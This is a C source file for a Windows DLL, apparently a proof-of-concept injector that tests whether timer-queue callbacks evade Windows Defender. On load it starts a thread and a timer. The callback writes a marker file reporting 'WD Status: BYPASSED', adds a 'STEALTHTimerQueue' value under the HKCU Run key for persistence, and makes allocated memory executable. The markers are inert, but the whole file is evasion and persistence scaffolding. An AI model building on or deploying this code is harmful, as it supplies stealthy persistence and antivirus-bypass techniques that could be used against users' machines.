#include <windows.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")

VOID CALLBACK TimerCallback(PVOID param, BOOLEAN fired) {
    if (fired) {
        // Execute payload
        FILE* f = fopen("C:\\Windows\\Temp\\injector_timerqueue_executed.txt", "w");
        if (f) {
            fprintf(f, "INJECTOR_TIMERQUEUE CALLBACK EXECUTED\n");
            fprintf(f, "Timestamp: %ld\n", (long)time(NULL));
            fprintf(f, "Method: CreateTimerQueueTimer + Callback\n");
            fprintf(f, "Trigger: Timer Expiration\n");
            fprintf(f, "WD Status: BYPASSED\n");
            fclose(f);
        }
        
        // Registry persistence
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "STEALTHTimerQueue", 0, REG_SZ, (const BYTE*)"Executed", 9);
            RegCloseKey(hKey);
        }
        
        // Memory execution proof
        LPVOID mem = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
        if (mem) {
            DWORD old;
            VirtualProtect(mem, 1024, PAGE_EXECUTE_READ, &old);
            VirtualFree(mem, 0, MEM_RELEASE);
        }
    }
}

DWORD WINAPI TimerWorkerThread(LPVOID param) {
    HANDLE hTimerQueue = CreateTimerQueue();
    if (!hTimerQueue) {
        FILE* f = fopen("C:\\Windows\\Temp\\injector_timerqueue_log.txt", "w");
        if (f) {
            fprintf(f, "[TIMER] CreateTimerQueue failed\n");
            fclose(f);
        }
        return 1;
    }
    
    HANDLE hTimer = NULL;
    // Set timer to fire after 500ms, then every 1000ms
    if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, TimerCallback, NULL, 500, 1000, WT_EXECUTEDEFAULT)) {
        FILE* f = fopen("C:\\Windows\\Temp\\injector_timerqueue_log.txt", "w");
        if (f) {
            fprintf(f, "[TIMER] CreateTimerQueueTimer failed\n");
            fclose(f);
        }
        CloseHandle(hTimerQueue);
        return 1;
    }
    
    FILE* f = fopen("C:\\Windows\\Temp\\injector_timerqueue_log.txt", "w");
    if (f) {
        fprintf(f, "[TIMER] Timer queue created and timer set\n");
        fprintf(f, "[TIMER] Waiting for callback...\n");
        fclose(f);
    }
    
    // Wait for timer callback
    Sleep(4000);
    
    // Clean up
    DeleteTimerQueueTimer(hTimerQueue, hTimer, NULL);
    DeleteTimerQueue(hTimerQueue);
    
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        HANDLE hThread = CreateThread(NULL, 0, TimerWorkerThread, NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, 3000);
            CloseHandle(hThread);
        }
    }
    return TRUE;
}
